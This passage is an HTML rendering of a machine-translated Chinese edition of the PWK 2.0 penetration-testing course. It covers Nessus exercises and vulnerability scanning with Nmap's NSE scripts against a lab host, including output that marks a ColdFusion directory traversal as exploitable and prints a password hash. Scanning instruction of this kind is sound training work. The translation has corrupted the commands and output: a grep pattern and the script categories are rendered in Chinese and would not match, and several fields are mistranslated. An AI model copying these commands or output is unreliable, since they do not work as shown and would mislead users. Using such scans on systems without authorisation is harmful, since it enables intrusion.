<div style="position:absolute;top:18717;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">请注意，扫描还生成了两个额外的</font></font><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">信息</font></font></i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">插件输出。</font><font style="vertical-align: inherit;">这些包括有关的详细信息</font></font></nobr></div>
<div style="position:absolute;top:18737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描和 SYN 扫描的结果。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:18771;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.2.6.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18801;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 按照上述步骤创建您自己的 Beta 个人扫描。</font></font></nobr></div>
<div style="position:absolute;top:18829;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">2. 在单独扫描期间运行 Wireshark 或 tcpdump。</font><font style="vertical-align: inherit;">Nessus 还会扫描哪些其他端口？</font></font></nobr></div>
<div style="position:absolute;top:18848;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">为什么你认为 Nessus 会扫描其他端口？</font></font></nobr></div>
<div style="position:absolute;top:18877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">3. 查看扫描结果。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:18914;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.3 使用 Nmap 进行漏洞扫描</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:18956;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为 Nessus 的替代方案，我们还可以使用 Nmap 脚本引擎 (NSE) </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">235</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来执行</font></font></nobr></div>
<div style="position:absolute;top:18975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">自动漏洞扫描。</font><font style="vertical-align: inherit;">虽然 NSE 不是一个成熟的漏洞扫描器，但它确实具有</font></font></nobr></div>
<div style="position:absolute;top:18994;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">可用于检测和验证漏洞的受人尊敬的脚本库。</font><font style="vertical-align: inherit;">NSE 脚本是</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:19055;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">235 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/nse.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:19183;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="17"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 17 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:19216;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:20293;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:20293;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:20293;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">237</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19312;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">用 Lua </font></font><font style="font-size:8px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">236</font></font></font><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">编写，</font><font style="vertical-align: inherit;">功能范围从蛮力和身份验证到检测和</font></font></nobr></div>
<div style="position:absolute;top:19331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">利用漏洞。</font><font style="vertical-align: inherit;">出于这些目的，我们将重点关注“vuln”和“exploit”中的脚本</font></font></nobr></div>
<div style="position:absolute;top:19350;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">类别，因为前者检测到漏洞，而后者试图利用它。</font></font></nobr></div>
<div style="position:absolute;top:19383;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，这些类别之间存在重叠，并且某些“漏洞”脚本实际上可能会运行</font></font></nobr></div>
<div style="position:absolute;top:19403;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">精简的漏洞利用。</font><font style="vertical-align: inherit;">出于这个原因，脚本也被进一步归类为“安全”或“侵入性”</font></font></nobr></div>
<div style="position:absolute;top:19422;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们在执行后者时应该非常小心，因为它们可能会使远程服务崩溃</font></font></nobr></div>
<div style="position:absolute;top:19441;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">或取下目标。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:14px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:19503;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">切勿盲目运行 NSE 脚本。</font><font style="vertical-align: inherit;">花时间检查它们以了解它们的内容</font></font></i></nobr></div>
<div style="position:absolute;top:19523;left:174"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在运行它们之前做，并尽可能在您自己的目标上进行测试。</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:19585;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 Kali 上，可以在 /usr/share/nmap/scripts/ 目录中找到 NSE 脚本。</font><font style="vertical-align: inherit;">打开任何一个</font></font></nobr></div>
<div style="position:absolute;top:19604;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">文本编辑器中的 *.nse 文件以简单易读的格式显示每个脚本的来源。</font></font></nobr></div>
<div style="position:absolute;top:19624;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">花时间查看一些 NSE 脚本以熟悉检查的格式和类型</font></font></nobr></div>
<div style="position:absolute;top:19643;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">这些脚本执行。</font></font></nobr></div>
<div style="position:absolute;top:19676;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">此文件夹还包含一个 script.db 文件，用作所有脚本的索引。</font><font style="vertical-align: inherit;">它也是</font></font></nobr></div>
<div style="position:absolute;top:19695;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">对每个 Nmap 脚本进行分类。</font><font style="vertical-align: inherit;">例如，我们可以使用该文件来</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">grep</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">中的脚本</font></font></nobr></div>
<div style="position:absolute;top:19714;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">“vuln”和“exploit”类别，如清单 278 所示：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:19749;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cd /usr/share/nmap/scripts/</font></font></font></b></nobr></div>
<div style="position:absolute;top:19783;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/usr/share/nmap/scripts$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">head -n 5 script.db</font></font></font></b></nobr></div>
<div style="position:absolute;top:19800;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "acarsd-info.nse", 类别 = { "发现", "安全", } }</font></font></nobr></div>
<div style="position:absolute;top:19817;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "address-info.nse", 类别 = { "default", "safe", } }</font></font></nobr></div>
<div style="position:absolute;top:19834;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "afp-brute.nse", 类别 = { "brute", "intrusive", } }</font></font></nobr></div>
<div style="position:absolute;top:19851;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "afp-ls.nse", 类别 = { "发现", "安全", } }</font></font></nobr></div>
<div style="position:absolute;top:19868;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "afp-path-vuln.nse", 类别 = { "exploit", "intrusive", "vuln",</font></font></nobr></div>
<div style="position:absolute;top:19902;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:/usr/share/nmap/scripts$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">cat script.db | </font><font style="vertical-align: inherit;">grep '"漏洞"\|"利用"'</font></font></font></b></nobr></div>
<div style="position:absolute;top:19919;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "afp-path-vuln.nse", 类别 = { "exploit", "intrusive", "vuln",</font></font></nobr></div>
<div style="position:absolute;top:19936;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "clamav-exec.nse", 类别 = { "exploit", "vuln", } }</font></font></nobr></div>
<div style="position:absolute;top:19953;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "distcc-cve2004-2687.nse", 类别 = { "exploit", "intrusive", "</font></font></nobr></div>
<div style="position:absolute;top:19970;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "ftp-proftpd-backdoor.nse", 类别 = { "exploit", "intrusive", </font></font></nobr></div>
<div style="position:absolute;top:19987;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">条目 { 文件名 = "ftp-vsftpd-backdoor.nse", 类别 = { "exploit", "intrusive", "</font></font></nobr></div>
<div style="position:absolute;top:20004;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">...</font></font></nobr></div>
<div style="position:absolute;top:20023;left:346"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 278 - Nmap 脚本数据库</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:20052;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">让我们尝试使用 NSE 来检测漏洞。</font><font style="vertical-align: inherit;">在这个例子中，我们将使用</font></font><b><font style="font-size:13px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">--script vuln</font></font></font></b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">来</font></font></nobr></div>
<div style="position:absolute;top:20072;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">针对 PWK 实验室中的目标运行“vuln”类别中的所有脚本：</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20107;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">kali@kali:~$ </font></font><b><font color="#0070c0"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">sudo nmap --script vuln 10.11.1.10</font></font></font></b></nobr></div>
<div style="position:absolute;top:20124;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">[sudo] 卡利密码： </font></font></nobr></div>
<div style="position:absolute;top:20141;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">启动 Nmap 7.70 ( https://nmap.org )</font></font></nobr></div>
<div style="position:absolute;top:20158;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">预扫描脚本结果：</font></font></nobr></div>
<div style="position:absolute;top:20175;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">广播avahi-dos：</font></font></nobr></div>
<div style="position:absolute;top:20192;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">发现的主机：</font></font></nobr></div>
</span></font>
<font size="2" face="Times"><span style="font-size:5px;font-family:Times">
<div style="position:absolute;top:20243;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">236 </font></font><font style="font-size:9px"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">（Nmap，2019），https://nmap.org/book/nse-language.html</font></font></font></nobr></div>
</span></font>

<div style="position:absolute;top:20371;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="18"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 18 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:20404;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:21481;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:21481;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:21481;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">238</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:20500;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">224.0.0.251</font></font></nobr></div>
<div style="position:absolute;top:20516;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">在 NULL UDP avahi 数据包 DoS (CVE-2011-1002) 之后。</font></font></nobr></div>
<div style="position:absolute;top:20533;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ 主机都已启动（不易受攻击）。</font></font></nobr></div>
<div style="position:absolute;top:20550;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">10.11.1.10 的 Nmap 扫描报告</font></font></nobr></div>
<div style="position:absolute;top:20568;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">主机已启动（0.099 秒延迟）。</font></font></nobr></div>
<div style="position:absolute;top:20584;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">未显示：999 个过滤端口</font></font></nobr></div>
<div style="position:absolute;top:20601;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">港口国服务</font></font></nobr></div>
<div style="position:absolute;top:20618;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">80/tcp 打开http</font></font></nobr></div>
<div style="position:absolute;top:20635;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http-cookie-标志：</font></font></nobr></div>
<div style="position:absolute;top:20652;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/CFIDE/administrator/enter.cfm：</font></font></nobr></div>
<div style="position:absolute;top:20669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">CFID：</font></font></nobr></div>
<div style="position:absolute;top:20686;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">未设置 httponly 标志</font></font></nobr></div>
<div style="position:absolute;top:20703;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">CFTOKEN：</font></font></nobr></div>
<div style="position:absolute;top:20720;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">未设置 httponly 标志</font></font></nobr></div>
<div style="position:absolute;top:20737;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/CFIDE/administrator/entman/index.cfm：</font></font></nobr></div>
<div style="position:absolute;top:20754;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">CFID：</font></font></nobr></div>
<div style="position:absolute;top:20771;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">未设置 httponly 标志</font></font></nobr></div>
<div style="position:absolute;top:20788;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">CFTOKEN：</font></font></nobr></div>
<div style="position:absolute;top:20805;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">未设置 httponly 标志</font></font></nobr></div>
<div style="position:absolute;top:20822;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/CFIDE/administrator/archives/index.cfm：</font></font></nobr></div>
<div style="position:absolute;top:20839;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">CFID：</font></font></nobr></div>
<div style="position:absolute;top:20856;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">未设置 httponly 标志</font></font></nobr></div>
<div style="position:absolute;top:20873;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">CFTOKEN：</font></font></nobr></div>
<div style="position:absolute;top:20890;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ httponly 标志未设置</font></font></nobr></div>
<div style="position:absolute;top:20907;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-csrf：找不到任何 CSRF 漏洞。</font></font></nobr></div>
<div style="position:absolute;top:20924;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-dombased-xss: 找不到任何基于 DOM 的 XSS。</font></font></nobr></div>
<div style="position:absolute;top:20941;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http 枚举：</font></font></nobr></div>
<div style="position:absolute;top:20958;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/CFIDE/administrator/enter.cfm：ColdFusion 管理控制台</font></font></nobr></div>
<div style="position:absolute;top:20975;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/CFIDE/administrator/entman/index.cfm：ColdFusion 管理控制台</font></font></nobr></div>
<div style="position:absolute;top:20992;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/cfide/install.cfm：ColdFusion 管理控制台</font></font></nobr></div>
<div style="position:absolute;top:21009;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/CFIDE/administrator/archives/index.cfm：ColdFusion 管理控制台</font></font></nobr></div>
<div style="position:absolute;top:21025;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">/CFIDE/wizards/common/_logintowizard.cfm：ColdFusion 管理控制台</font></font></nobr></div>
<div style="position:absolute;top:21042;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ /CFIDE/componentutils/login.cfm：ColdFusion 管理控制台</font></font></nobr></div>
<div style="position:absolute;top:21060;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_http-stored-xss：找不到任何存储的 XSS 漏洞。</font></font></nobr></div>
<div style="position:absolute;top:21077;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http-vuln-cve2010-2861：</font></font></nobr></div>
<div style="position:absolute;top:21094;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">易受伤害的：</font></font></nobr></div>
<div style="position:absolute;top:21110;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">Adobe ColdFusion 目录遍历漏洞</font></font></nobr></div>
<div style="position:absolute;top:21127;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|     </font></font><b><font color="#c00000"><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">状态：易受攻击（可利用）</font></font></font></b></nobr></div>
<div style="position:absolute;top:21144;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">ID：CVE:CVE-2010-2861 OSVDB:67047</font></font></nobr></div>
<div style="position:absolute;top:21161;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">管理员控制台中的多目录遍历漏洞</font></font></nobr></div>
<div style="position:absolute;top:21178;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">在 Adob​​e ColdFusion 9.0.1 及更早版本中允许远程攻击者读取任意</font></font></nobr></div>
<div style="position:absolute;top:21195;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">文件通过 locale 参数</font></font></nobr></div>
<div style="position:absolute;top:21212;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">披露日期：2010-08-10</font></font></nobr></div>
<div style="position:absolute;top:21229;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">额外的信息：</font></font></nobr></div>
<div style="position:absolute;top:21246;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|    </font></font></nobr></div>
<div style="position:absolute;top:21263;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">冷聚变8</font></font></nobr></div>
<div style="position:absolute;top:21280;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">HMAC：749CD10DC95AF1713642CC5A1046857830C05E0B</font></font></nobr></div>
<div style="position:absolute;top:21297;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">盐：1560458235684</font></font></nobr></div>
<div style="position:absolute;top:21314;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">哈希：AAFDC23870ECBCD3D557B6423A8982134E17927E</font></font></nobr></div>
<div style="position:absolute;top:21331;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|   </font></font></nobr></div>
<div style="position:absolute;top:21348;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">参考：</font></font></nobr></div>
<div style="position:absolute;top:21365;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2010-2861</font></font></nobr></div>
<div style="position:absolute;top:21382;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2861</font></font></nobr></div>
<div style="position:absolute;top:21399;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http://www.blackhatacademy.org/security101/Cold_Fusion_Hacking</font></font></nobr></div>
<div style="position:absolute;top:21416;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">| </font><font style="vertical-align: inherit;">http://osvdb.org/67047</font></font></nobr></div>
</span></font>

<div style="position:absolute;top:21559;left:0"><hr><table border="0" width="100%"><tbody><tr><td bgcolor="eeeeee" align="right"><font face="arial,sans-serif"><a name="19"><b><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">第 19 页</font></font></b></a></font></td></tr></tbody></table></div><font size="2" face="Times"><span style="font-size:9px;font-family:Times">
<div style="position:absolute;top:21592;left:611"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">使用 Kali Linux 2.0 进行渗透测试</font></font></nobr></div>
<div style="position:absolute;top:22669;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">PWK 2.0</font></font></nobr></div>
<div style="position:absolute;top:22669;left:318"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">版权所有 © Offensive Security Ltd. 保留所有权利。</font></font></nobr></div>
<div style="position:absolute;top:22669;left:791"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">239</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:11px;font-family:Times">
<div style="position:absolute;top:21688;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">|_ http://www.nessus.org/plugins/index.php?view=single&amp;id=48340</font></font></nobr></div>
<div style="position:absolute;top:21704;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">MAC 地址：00:50:56:93:38:CA (VMware)</font></font></nobr></div>
<div style="position:absolute;top:21724;left:204"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">清单 279 - 在 PWK 实验室中针对特定虚拟机使用 NSE 的“vuln”脚本</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21753;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们看到 http-vuln-cve2010-2861.nse 脚本成功检测到 Adob​​e Coldfusion</font></font></nobr></div>
<div style="position:absolute;top:21773;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">我们目标的脆弱性。</font><font style="vertical-align: inherit;">这很有趣，值得进一步研究。</font></font></nobr></div>
<div style="position:absolute;top:21806;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">虽然 Nmap 不是传统意义上的漏洞扫描器，但它对于类似</font></font></nobr></div>
<div style="position:absolute;top:21825;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">任务。</font><font style="vertical-align: inherit;">我们可以在渗透测试期间使用 Nmap 来验证漏洞扫描器的结果，以服务</font></font></nobr></div>
<div style="position:absolute;top:21844;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">作为专用扫描仪的备份，并帮助减少误报。</font></font></nobr></div>
<div style="position:absolute;top:21877;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">但是，Nmap 也需要注意适用于传统漏洞的相同警告</font></font></nobr></div>
<div style="position:absolute;top:21896;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">扫描仪。</font><font style="vertical-align: inherit;">我们必须了解脚本将检查和不检查的内容、流量</font></font></nobr></div>
<div style="position:absolute;top:21916;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">脚本将生成，以及每个脚本可能导致的潜在危险。</font></font></nobr></div>
</span></font>
<font size="3" color="#0070c0" face="Times"><span style="font-size:16px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:21950;left:109"><nobr><i><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.3.1.1 练习</font></font></i></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
<div style="position:absolute;top:21980;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">1. 找到一个类似于 NFS 导出共享信息披露的 NSE 脚本</font></font></nobr></div>
<div style="position:absolute;top:21999;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在“使用单个 Nessus 插件扫描”部分中执行。</font><font style="vertical-align: inherit;">找到后，运行脚本</font></font></nobr></div>
<div style="position:absolute;top:22019;left:145"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">在 PWK 实验室对抗 Beta。</font></font></nobr></div>
</span></font>
<font size="4" color="#0070c0" face="Times"><span style="font-size:22px;font-family:Times;color:#0070c0">
<div style="position:absolute;top:22056;left:109"><nobr><font style="vertical-align: inherit;"><font style="vertical-align: inherit;">8.4 总结</font></font></nobr></div>
</span></font>
<font size="3" face="Times"><span style="font-size:14px;font-family:Times">
